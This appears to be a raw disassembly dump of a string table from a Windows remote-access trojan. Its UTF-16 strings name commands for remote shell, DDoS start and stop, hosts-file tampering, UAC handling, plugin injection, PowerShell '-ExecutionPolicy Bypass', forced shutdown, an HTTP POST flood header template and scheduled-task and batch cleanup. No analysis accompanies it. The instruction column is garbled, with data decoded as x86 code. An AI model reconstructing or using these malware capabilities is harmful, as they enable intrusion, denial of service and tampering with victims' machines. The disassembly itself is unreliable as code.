  40b05c:	65 00 00             	add    %al,%gs:(%eax)
  40b05f:	05 44 00 57 00       	add    $0x570044,%eax
  40b064:	00 05 46 00 4d 00    	add    %al,0x4d0046
  40b06a:	00 05 4c 00 4e 00    	add    %al,0x4e004c
  40b070:	00 0f                	add    %cl,(%edi)
  40b072:	55                   	push   %ebp
  40b073:	00 72 00             	add    %dh,0x0(%edx)
  40b076:	6c                   	insb   (%dx),%es:(%edi)
  40b077:	00 6f 00             	add    %ch,0x0(%edi)
  40b07a:	70 00                	jo     0x40b07c
  40b07c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b080:	00 0f                	add    %cl,(%edi)
  40b082:	55                   	push   %ebp
  40b083:	00 72 00             	add    %dh,0x0(%edx)
  40b086:	6c                   	insb   (%dx),%es:(%edi)
  40b087:	00 68 00             	add    %ch,0x0(%eax)
  40b08a:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40b090:	00 15 50 00 43 00    	add    %dl,0x430050
  40b096:	53                   	push   %ebx
  40b097:	00 68 00             	add    %ch,0x0(%eax)
  40b09a:	75 00                	jne    0x40b09c
  40b09c:	74 00                	je     0x40b09e
  40b09e:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40b0a2:	77 00                	ja     0x40b0a4
  40b0a4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0a5:	00 00                	add    %al,(%eax)
  40b0a7:	2f                   	das
  40b0a8:	73 00                	jae    0x40b0aa
  40b0aa:	68 00 75 00 74       	push   $0x74007500
  40b0af:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40b0b3:	00 77 00             	add    %dh,0x0(%edi)
  40b0b6:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0b7:	00 2e                	add    %ch,(%esi)
  40b0b9:	00 65 00             	add    %ah,0x0(%ebp)
  40b0bc:	78 00                	js     0x40b0be
  40b0be:	65 00 20             	add    %ah,%gs:(%eax)
  40b0c1:	00 2f                	add    %ch,(%edi)
  40b0c3:	00 66 00             	add    %ah,0x0(%esi)
  40b0c6:	20 00                	and    %al,(%eax)
  40b0c8:	2f                   	das
  40b0c9:	00 73 00             	add    %dh,0x0(%ebx)
  40b0cc:	20 00                	and    %al,(%eax)
  40b0ce:	2f                   	das
  40b0cf:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40b0d3:	00 30                	add    %dh,(%eax)
  40b0d5:	00 00                	add    %al,(%eax)
  40b0d7:	13 50 00             	adc    0x0(%eax),%edx
  40b0da:	43                   	inc    %ebx
  40b0db:	00 52 00             	add    %dl,0x0(%edx)
  40b0de:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b0e2:	74 00                	je     0x40b0e4
  40b0e4:	61                   	popa
  40b0e5:	00 72 00             	add    %dh,0x0(%edx)
  40b0e8:	74 00                	je     0x40b0ea
  40b0ea:	00 2f                	add    %ch,(%edi)
  40b0ec:	73 00                	jae    0x40b0ee
  40b0ee:	68 00 75 00 74       	push   $0x74007500
  40b0f3:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40b0f7:	00 77 00             	add    %dh,0x0(%edi)
  40b0fa:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0fb:	00 2e                	add    %ch,(%esi)
  40b0fd:	00 65 00             	add    %ah,0x0(%ebp)
  40b100:	78 00                	js     0x40b102
  40b102:	65 00 20             	add    %ah,%gs:(%eax)
  40b105:	00 2f                	add    %ch,(%edi)
  40b107:	00 66 00             	add    %ah,0x0(%esi)
  40b10a:	20 00                	and    %al,(%eax)
  40b10c:	2f                   	das
  40b10d:	00 72 00             	add    %dh,0x0(%edx)
  40b110:	20 00                	and    %al,(%eax)
  40b112:	2f                   	das
  40b113:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40b117:	00 30                	add    %dh,(%eax)
  40b119:	00 00                	add    %al,(%eax)
  40b11b:	11 50 00             	adc    %edx,0x0(%eax)
  40b11e:	43                   	inc    %ebx
  40b11f:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b123:	00 67 00             	add    %ah,0x0(%edi)
  40b126:	6f                   	outsl  %ds:(%esi),(%dx)
  40b127:	00 66 00             	add    %ah,0x0(%esi)
  40b12a:	66 00 00             	data16 add %al,(%eax)
  40b12d:	1f                   	pop    %ds
  40b12e:	73 00                	jae    0x40b130
  40b130:	68 00 75 00 74       	push   $0x74007500
  40b135:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40b139:	00 77 00             	add    %dh,0x0(%edi)
  40b13c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b13d:	00 2e                	add    %ch,(%esi)
  40b13f:	00 65 00             	add    %ah,0x0(%ebp)
  40b142:	78 00                	js     0x40b144
  40b144:	65 00 20             	add    %ah,%gs:(%eax)
  40b147:	00 2d 00 4c 00 01    	add    %ch,0x1004c00
  40b14d:	11 52 00             	adc    %edx,0x0(%edx)
  40b150:	75 00                	jne    0x40b152
  40b152:	6e                   	outsb  %ds:(%esi),(%dx)
  40b153:	00 53 00             	add    %dl,0x0(%ebx)
  40b156:	68 00 65 00 6c       	push   $0x6c006500
  40b15b:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b15f:	13 53 00             	adc    0x0(%ebx),%edx
  40b162:	74 00                	je     0x40b164
  40b164:	61                   	popa
  40b165:	00 72 00             	add    %dh,0x0(%edx)
  40b168:	74 00                	je     0x40b16a
  40b16a:	44                   	inc    %esp
  40b16b:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40b16f:	00 73 00             	add    %dh,0x0(%ebx)
  40b172:	00 11                	add    %dl,(%ecx)
  40b174:	53                   	push   %ebx
  40b175:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b179:	00 70 00             	add    %dh,0x0(%eax)
  40b17c:	44                   	inc    %esp
  40b17d:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40b181:	00 73 00             	add    %dh,0x0(%ebx)
  40b184:	00 17                	add    %dl,(%edi)
  40b186:	53                   	push   %ebx
  40b187:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b18b:	00 72 00             	add    %dh,0x0(%edx)
  40b18e:	74 00                	je     0x40b190
  40b190:	52                   	push   %edx
  40b191:	00 65 00             	add    %ah,0x0(%ebp)
  40b194:	70 00                	jo     0x40b196
  40b196:	6f                   	outsl  %ds:(%esi),(%dx)
  40b197:	00 72 00             	add    %dh,0x0(%edx)
  40b19a:	74 00                	je     0x40b19c
  40b19c:	00 15 53 00 74 00    	add    %dl,0x740053
  40b1a2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1a3:	00 70 00             	add    %dh,0x0(%eax)
  40b1a6:	52                   	push   %edx
  40b1a7:	00 65 00             	add    %ah,0x0(%ebp)
  40b1aa:	70 00                	jo     0x40b1ac
  40b1ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1ad:	00 72 00             	add    %dh,0x0(%edx)
  40b1b0:	74 00                	je     0x40b1b2
  40b1b2:	00 0b                	add    %cl,(%ebx)
  40b1b4:	58                   	pop    %eax
  40b1b5:	00 63 00             	add    %ah,0x0(%ebx)
  40b1b8:	68 00 61 00 74       	push   $0x74006100
  40b1bd:	00 00                	add    %al,(%eax)
  40b1bf:	0b 48 00             	or     0x0(%eax),%ecx
  40b1c2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1c3:	00 73 00             	add    %dh,0x0(%ebx)
  40b1c6:	74 00                	je     0x40b1c8
  40b1c8:	73 00                	jae    0x40b1ca
  40b1ca:	00 25 5c 00 64 00    	add    %ah,0x64005c
  40b1d0:	72 00                	jb     0x40b1d2
  40b1d2:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40b1d8:	72 00                	jb     0x40b1da
  40b1da:	73 00                	jae    0x40b1dc
  40b1dc:	5c                   	pop    %esp
  40b1dd:	00 65 00             	add    %ah,0x0(%ebp)
  40b1e0:	74 00                	je     0x40b1e2
  40b1e2:	63 00                	arpl   %eax,(%eax)
  40b1e4:	5c                   	pop    %esp
  40b1e5:	00 68 00             	add    %ch,0x0(%eax)
  40b1e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1e9:	00 73 00             	add    %dh,0x0(%ebx)
  40b1ec:	74 00                	je     0x40b1ee
  40b1ee:	73 00                	jae    0x40b1f0
  40b1f0:	00 0d 53 00 68 00    	add    %cl,0x680053
  40b1f6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1f7:	00 73 00             	add    %dh,0x0(%ebx)
  40b1fa:	74 00                	je     0x40b1fc
  40b1fc:	73 00                	jae    0x40b1fe
  40b1fe:	00 11                	add    %dl,(%ecx)
  40b200:	48                   	dec    %eax
  40b201:	00 6f 00             	add    %ch,0x0(%edi)
  40b204:	73 00                	jae    0x40b206
  40b206:	74 00                	je     0x40b208
  40b208:	73 00                	jae    0x40b20a
  40b20a:	4d                   	dec    %ebp
  40b20b:	00 53 00             	add    %dl,0x0(%ebx)
  40b20e:	47                   	inc    %edi
  40b20f:	00 00                	add    %al,(%eax)
  40b211:	2d 4d 00 6f 00       	sub    $0x6f004d,%eax
  40b216:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b21a:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40b21e:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40b223:	00 73 00             	add    %dh,0x0(%ebx)
  40b226:	75 00                	jne    0x40b228
  40b228:	63 00                	arpl   %eax,(%eax)
  40b22a:	63 00                	arpl   %eax,(%eax)
  40b22c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b230:	73 00                	jae    0x40b232
  40b232:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40b236:	6c                   	insb   (%dx),%es:(%edi)
  40b237:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40b23b:	00 21                	add    %ah,(%ecx)
  40b23d:	00 00                	add    %al,(%eax)
  40b23f:	11 48 00             	adc    %ecx,0x0(%eax)
  40b242:	6f                   	outsl  %ds:(%esi),(%dx)
  40b243:	00 73 00             	add    %dh,0x0(%ebx)
  40b246:	74 00                	je     0x40b248
  40b248:	73 00                	jae    0x40b24a
  40b24a:	45                   	inc    %ebp
  40b24b:	00 72 00             	add    %dh,0x0(%edx)
  40b24e:	72 00                	jb     0x40b250
  40b250:	00 09                	add    %cl,(%ecx)
  40b252:	44                   	inc    %esp
  40b253:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40b257:	00 73 00             	add    %dh,0x0(%ebx)
  40b25a:	00 0d 70 00 6c 00    	add    %cl,0x6c0070
  40b260:	75 00                	jne    0x40b262
  40b262:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b266:	6e                   	outsb  %ds:(%esi),(%dx)
  40b267:	00 00                	add    %al,(%eax)
  40b269:	15 73 00 65 00       	adc    $0x650073,%eax
  40b26e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b26f:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40b273:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b277:	00 67 00             	add    %ah,0x0(%edi)
  40b27a:	69 00 6e 00 00 15    	imul   $0x1500006e,(%eax),%eax
  40b280:	73 00                	jae    0x40b282
  40b282:	61                   	popa
  40b283:	00 76 00             	add    %dh,0x0(%esi)
  40b286:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b28a:	6c                   	insb   (%dx),%es:(%edi)
  40b28b:	00 75 00             	add    %dh,0x0(%ebp)
  40b28e:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b292:	6e                   	outsb  %ds:(%esi),(%dx)
  40b293:	00 00                	add    %al,(%eax)
  40b295:	1b 52 00             	sbb    0x0(%edx),%edx
  40b298:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b29c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b29d:	00 76 00             	add    %dh,0x0(%esi)
  40b2a0:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b2a4:	6c                   	insb   (%dx),%es:(%edi)
  40b2a5:	00 75 00             	add    %dh,0x0(%ebp)
  40b2a8:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b2ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2ad:	00 73 00             	add    %dh,0x0(%ebx)
  40b2b0:	00 21                	add    %ah,(%ecx)
  40b2b2:	50                   	push   %eax
  40b2b3:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b2b7:	00 67 00             	add    %ah,0x0(%edi)
  40b2ba:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  40b2c0:	20 00                	and    %al,(%eax)
  40b2c2:	52                   	push   %edx
  40b2c3:	00 65 00             	add    %ah,0x0(%ebp)
  40b2c6:	6d                   	insl   (%dx),%es:(%edi)
  40b2c7:	00 6f 00             	add    %ch,0x0(%edi)
  40b2ca:	76 00                	jbe    0x40b2cc
  40b2cc:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  40b2d1:	00 00                	add    %al,(%eax)
  40b2d3:	15 4f 00 66 00       	adc    $0x66004f,%eax
  40b2d8:	66 00 6c 00 69       	data16 add %ch,0x69(%eax,%eax,1)
  40b2dd:	00 6e 00             	add    %ch,0x0(%esi)
  40b2e0:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40b2e4:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  40b2e9:	09 24 00             	or     %esp,(%eax,%eax,1)
  40b2ec:	43                   	inc    %ebx
  40b2ed:	00 61 00             	add    %ah,0x0(%ecx)
  40b2f0:	70 00                	jo     0x40b2f2
  40b2f2:	00 09                	add    %cl,(%ecx)
  40b2f4:	23 00                	and    (%eax),%eax
  40b2f6:	43                   	inc    %ebx
  40b2f7:	00 41 00             	add    %al,0x0(%ecx)
  40b2fa:	50                   	push   %eax
  40b2fb:	00 00                	add    %al,(%eax)
  40b2fd:	0d 50 00 6c 00       	or     $0x6c0050,%eax
  40b302:	75 00                	jne    0x40b304
  40b304:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b308:	6e                   	outsb  %ds:(%esi),(%dx)
  40b309:	00 00                	add    %al,(%eax)
  40b30b:	07                   	pop    %es
  40b30c:	52                   	push   %edx
  40b30d:	00 75 00             	add    %dh,0x0(%ebp)
  40b310:	6e                   	outsb  %ds:(%esi),(%dx)
  40b311:	00 00                	add    %al,(%eax)
  40b313:	0d 49 00 6e 00       	or     $0x6e0049,%eax
  40b318:	76 00                	jbe    0x40b31a
  40b31a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b31b:	00 6b 00             	add    %ch,0x0(%ebx)
  40b31e:	65 00 00             	add    %al,%gs:(%eax)
  40b321:	17                   	pop    %ss
  40b322:	52                   	push   %edx
  40b323:	00 75 00             	add    %dh,0x0(%ebp)
  40b326:	6e                   	outsb  %ds:(%esi),(%dx)
  40b327:	00 52 00             	add    %dl,0x0(%edx)
  40b32a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b32e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b32f:	00 76 00             	add    %dh,0x0(%esi)
  40b332:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b336:	79 00                	jns    0x40b338
  40b338:	00 11                	add    %dl,(%ecx)
  40b33a:	52                   	push   %edx
  40b33b:	00 65 00             	add    %ah,0x0(%ebp)
  40b33e:	63 00                	arpl   %eax,(%eax)
  40b340:	6f                   	outsl  %ds:(%esi),(%dx)
  40b341:	00 76 00             	add    %dh,0x0(%esi)
  40b344:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b348:	79 00                	jns    0x40b34a
  40b34a:	00 15 52 00 75 00    	add    %dl,0x750052
  40b350:	6e                   	outsb  %ds:(%esi),(%dx)
  40b351:	00 4f 00             	add    %cl,0x0(%edi)
  40b354:	70 00                	jo     0x40b356
  40b356:	74 00                	je     0x40b358
  40b358:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b35e:	73 00                	jae    0x40b360
  40b360:	00 0d 69 00 6e 00    	add    %cl,0x6e0069
  40b366:	6a 00                	push   $0x0
  40b368:	52                   	push   %edx
  40b369:	00 75 00             	add    %dh,0x0(%ebp)
  40b36c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b36d:	00 00                	add    %al,(%eax)
  40b36f:	0f 55 00             	andnps (%eax),%xmm0
  40b372:	41                   	inc    %ecx
  40b373:	00 43 00             	add    %al,0x0(%ebx)
  40b376:	46                   	inc    %esi
  40b377:	00 75 00             	add    %dh,0x0(%ebp)
  40b37a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b37b:	00 63 00             	add    %ah,0x0(%ebx)
  40b37e:	00 07                	add    %al,(%edi)
  40b380:	45                   	inc    %ebp
  40b381:	00 4e 00             	add    %cl,0x0(%esi)
  40b384:	43                   	inc    %ebx
  40b385:	00 00                	add    %al,(%eax)
  40b387:	07                   	pop    %es
  40b388:	44                   	inc    %esp
  40b389:	00 45 00             	add    %al,0x0(%ebp)
  40b38c:	43                   	inc    %ebx
  40b38d:	00 00                	add    %al,(%eax)
  40b38f:	1d 50 00 6c 00       	sbb    $0x6c0050,%eax
  40b394:	75 00                	jne    0x40b396
  40b396:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b39a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b39b:	00 20                	add    %ah,(%eax)
  40b39d:	00 45 00             	add    %al,0x0(%ebp)
  40b3a0:	72 00                	jb     0x40b3a2
  40b3a2:	72 00                	jb     0x40b3a4
  40b3a4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3a5:	00 72 00             	add    %dh,0x0(%edx)
  40b3a8:	21 00                	and    %eax,(%eax)
  40b3aa:	20 00                	and    %al,(%eax)
  40b3ac:	00 07                	add    %al,(%edi)
  40b3ae:	4d                   	dec    %ebp
  40b3af:	00 73 00             	add    %dh,0x0(%ebx)
  40b3b2:	67 00 00             	add    %al,(%bx,%si)
  40b3b5:	0f 54 00             	andps  (%eax),%xmm0
  40b3b8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3b9:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b3bd:	00 77 00             	add    %dh,0x0(%edi)
  40b3c0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b3c4:	00 0d 4f 00 70 00    	add    %cl,0x70004f
  40b3ca:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b3ce:	20 00                	and    %al,(%eax)
  40b3d0:	5b                   	pop    %ebx
  40b3d1:	00 00                	add    %al,(%eax)
  40b3d3:	03 5d 00             	add    0x0(%ebp),%ebx
  40b3d6:	00 07                	add    %al,(%edi)
  40b3d8:	47                   	inc    %edi
  40b3d9:	00 45 00             	add    %al,0x0(%ebp)
  40b3dc:	54                   	push   %esp
  40b3dd:	00 00                	add    %al,(%eax)
  40b3df:	09 2e                	or     %ebp,(%esi)
  40b3e1:	00 70 00             	add    %dh,0x0(%eax)
  40b3e4:	73 00                	jae    0x40b3e6
  40b3e6:	31 00                	xor    %eax,(%eax)
  40b3e8:	00 3f                	add    %bh,(%edi)
  40b3ea:	2d 00 45 00 78       	sub    $0x78004500,%eax
  40b3ef:	00 65 00             	add    %ah,0x0(%ebp)
  40b3f2:	63 00                	arpl   %eax,(%eax)
  40b3f4:	75 00                	jne    0x40b3f6
  40b3f6:	74 00                	je     0x40b3f8
  40b3f8:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b3fe:	50                   	push   %eax
  40b3ff:	00 6f 00             	add    %ch,0x0(%edi)
  40b402:	6c                   	insb   (%dx),%es:(%edi)
  40b403:	00 69 00             	add    %ch,0x0(%ecx)
  40b406:	63 00                	arpl   %eax,(%eax)
  40b408:	79 00                	jns    0x40b40a
  40b40a:	20 00                	and    %al,(%eax)
  40b40c:	42                   	inc    %edx
  40b40d:	00 79 00             	add    %bh,0x0(%ecx)
  40b410:	70 00                	jo     0x40b412
  40b412:	61                   	popa
  40b413:	00 73 00             	add    %dh,0x0(%ebx)
  40b416:	73 00                	jae    0x40b418
  40b418:	20 00                	and    %al,(%eax)
  40b41a:	2d 00 46 00 69       	sub    $0x69004600,%eax
  40b41f:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b423:	00 20                	add    %ah,(%eax)
  40b425:	00 22                	add    %ah,(%edx)
  40b427:	00 01                	add    %al,(%ecx)
  40b429:	2f                   	das
  40b42a:	50                   	push   %eax
  40b42b:	00 4f 00             	add    %cl,0x0(%edi)
  40b42e:	53                   	push   %ebx
  40b42f:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40b433:	00 2f                	add    %ch,(%edi)
  40b435:	00 20                	add    %ah,(%eax)
  40b437:	00 48 00             	add    %cl,0x0(%eax)
  40b43a:	54                   	push   %esp
  40b43b:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40b43f:	00 2f                	add    %ch,(%edi)
  40b441:	00 31                	add    %dh,(%ecx)
  40b443:	00 2e                	add    %ch,(%esi)
  40b445:	00 31                	add    %dh,(%ecx)
  40b447:	00 0d 00 0a 00 48    	add    %cl,0x48000a00
  40b44d:	00 6f 00             	add    %ch,0x0(%edi)
  40b450:	73 00                	jae    0x40b452
  40b452:	74 00                	je     0x40b454
  40b454:	3a 00                	cmp    (%eax),%al
  40b456:	20 00                	and    %al,(%eax)
  40b458:	00 80 af 0d 00 0a    	add    %al,0xa000daf(%eax)
  40b45e:	00 43 00             	add    %al,0x0(%ebx)
  40b461:	6f                   	outsl  %ds:(%esi),(%dx)
  40b462:	00 6e 00             	add    %ch,0x0(%esi)
  40b465:	6e                   	outsb  %ds:(%esi),(%dx)
  40b466:	00 65 00             	add    %ah,0x0(%ebp)
  40b469:	63 00                	arpl   %eax,(%eax)
  40b46b:	74 00                	je     0x40b46d
  40b46d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b473:	3a 00                	cmp    (%eax),%al
  40b475:	20 00                	and    %al,(%eax)
  40b477:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b47a:	00 65 00             	add    %ah,0x0(%ebp)
  40b47d:	70 00                	jo     0x40b47f
  40b47f:	2d 00 61 00 6c       	sub    $0x6c006100,%eax
  40b484:	00 69 00             	add    %ch,0x0(%ecx)
  40b487:	76 00                	jbe    0x40b489
  40b489:	65 00 0d 00 0a 00 43 	add    %cl,%gs:0x43000a00
  40b490:	00 6f 00             	add    %ch,0x0(%edi)
  40b493:	6e                   	outsb  %ds:(%esi),(%dx)
  40b494:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b498:	00 6e 00             	add    %ch,0x0(%esi)
  40b49b:	74 00                	je     0x40b49d
  40b49d:	2d 00 54 00 79       	sub    $0x79005400,%eax
  40b4a2:	00 70 00             	add    %dh,0x0(%eax)
  40b4a5:	65 00 3a             	add    %bh,%gs:(%edx)
  40b4a8:	00 20                	add    %ah,(%eax)
  40b4aa:	00 61 00             	add    %ah,0x0(%ecx)
  40b4ad:	70 00                	jo     0x40b4af
  40b4af:	70 00                	jo     0x40b4b1
  40b4b1:	6c                   	insb   (%dx),%es:(%edi)
  40b4b2:	00 69 00             	add    %ch,0x0(%ecx)
  40b4b5:	63 00                	arpl   %eax,(%eax)
  40b4b7:	61                   	popa
  40b4b8:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b4bc:	00 6f 00             	add    %ch,0x0(%edi)
  40b4bf:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4c0:	00 2f                	add    %ch,(%edi)
  40b4c2:	00 78 00             	add    %bh,0x0(%eax)
  40b4c5:	2d 00 77 00 77       	sub    $0x77007700,%eax
  40b4ca:	00 77 00             	add    %dh,0x0(%edi)
  40b4cd:	2d 00 66 00 6f       	sub    $0x6f006600,%eax
  40b4d2:	00 72 00             	add    %dh,0x0(%edx)
  40b4d5:	6d                   	insl   (%dx),%es:(%edi)
  40b4d6:	00 2d 00 75 00 72    	add    %ch,0x72007500
  40b4dc:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b4e0:	00 6e 00             	add    %ch,0x0(%esi)
  40b4e3:	63 00                	arpl   %eax,(%eax)
  40b4e5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4e6:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b4ea:	00 64 00 0d          	add    %ah,0xd(%eax,%eax,1)
  40b4ee:	00 0a                	add    %cl,(%edx)
  40b4f0:	00 55 00             	add    %dl,0x0(%ebp)
  40b4f3:	73 00                	jae    0x40b4f5
  40b4f5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b4f9:	2d 00 41 00 67       	sub    $0x67004100,%eax
  40b4fe:	00 65 00             	add    %ah,0x0(%ebp)
  40b501:	6e                   	outsb  %ds:(%esi),(%dx)
  40b502:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  40b506:	00 20                	add    %ah,(%eax)
  40b508:	00 01                	add    %al,(%ecx)
  40b50a:	35 0d 00 0a 00       	xor    $0xa000d,%eax
  40b50f:	43                   	inc    %ebx
  40b510:	00 6f 00             	add    %ch,0x0(%edi)
  40b513:	6e                   	outsb  %ds:(%esi),(%dx)
  40b514:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b518:	00 6e 00             	add    %ch,0x0(%esi)
  40b51b:	74 00                	je     0x40b51d
  40b51d:	2d 00 6c 00 65       	sub    $0x65006c00,%eax
  40b522:	00 6e 00             	add    %ch,0x0(%esi)
  40b525:	67 00 74 00          	add    %dh,0x0(%si)
  40b529:	68 00 3a 00 20       	push   $0x20003a00
  40b52e:	00 35 00 32 00 33    	add    %dh,0x33003200
  40b534:	00 35 00 0d 00 0a    	add    %dh,0xa000d00
  40b53a:	00 0d 00 0a 00 01    	add    %cl,0x1000a00
  40b540:	11 73 00             	adc    %esi,0x0(%ebx)
  40b543:	63 00                	arpl   %eax,(%eax)
  40b545:	68 00 74 00 61       	push   $0x61007400
  40b54a:	00 73 00             	add    %dh,0x0(%ebx)
  40b54d:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b550:	00 00                	add    %al,(%eax)
  40b552:	23 2f                	and    (%edi),%ebp
  40b554:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b558:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b55c:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b560:	00 20                	add    %ah,(%eax)
  40b562:	00 2f                	add    %ch,(%edi)
  40b564:	00 66 00             	add    %ah,0x0(%esi)
  40b567:	20 00                	and    %al,(%eax)
  40b569:	20 00                	and    %al,(%eax)
  40b56b:	2f                   	das
  40b56c:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b570:	00 20                	add    %ah,(%eax)
  40b572:	00 22                	add    %ah,(%edx)
  40b574:	00 00                	add    %al,(%eax)
  40b576:	1b 61 00             	sbb    0x0(%ecx),%esp
  40b579:	74 00                	je     0x40b57b
  40b57b:	74 00                	je     0x40b57d
  40b57d:	72 00                	jb     0x40b57f
  40b57f:	69 00 62 00 20 00    	imul   $0x200062,(%eax),%eax
  40b585:	2d 00 68 00 20       	sub    $0x20006800,%eax
  40b58a:	00 2d 00 73 00 20    	add    %ch,0x20007300
  40b590:	00 01                	add    %al,(%ecx)
  40b592:	13 2a                	adc    (%edx),%ebp
  40b594:	00 2e                	add    %ch,(%esi)
  40b596:	00 2a                	add    %ch,(%edx)
  40b598:	00 20                	add    %ah,(%eax)
  40b59a:	00 2f                	add    %ch,(%edi)
  40b59c:	00 73 00             	add    %dh,0x0(%ebx)
  40b59f:	20 00                	and    %al,(%eax)
  40b5a1:	2f                   	das
  40b5a2:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b5a6:	0b 2a                	or     (%edx),%ebp
  40b5a8:	00 2e                	add    %ch,(%esi)
  40b5aa:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40b5ae:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5b1:	00 09                	add    %cl,(%ecx)
  40b5b3:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  40b5b7:	61                   	popa
  40b5b8:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b5bc:	13 40 00             	adc    0x0(%eax),%eax
  40b5bf:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b5c3:	68 00 6f 00 20       	push   $0x20006f00
  40b5c8:	00 6f 00             	add    %ch,0x0(%edi)
  40b5cb:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b5cf:	00 1f                	add    %bl,(%edi)
  40b5d1:	74 00                	je     0x40b5d3
  40b5d3:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b5d9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5da:	00 75 00             	add    %dh,0x0(%ebp)
  40b5dd:	74 00                	je     0x40b5df
  40b5df:	20 00                	and    %al,(%eax)
  40b5e1:	33 00                	xor    (%eax),%eax
  40b5e3:	20 00                	and    %al,(%eax)
  40b5e5:	3e 00 20             	add    %ah,%ds:(%eax)
  40b5e8:	00 4e 00             	add    %cl,0x0(%esi)
  40b5eb:	55                   	push   %ebp
  40b5ec:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b5f0:	07                   	pop    %es
  40b5f1:	43                   	inc    %ebx
  40b5f2:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b5f6:	00 00                	add    %al,(%eax)
  40b5f8:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
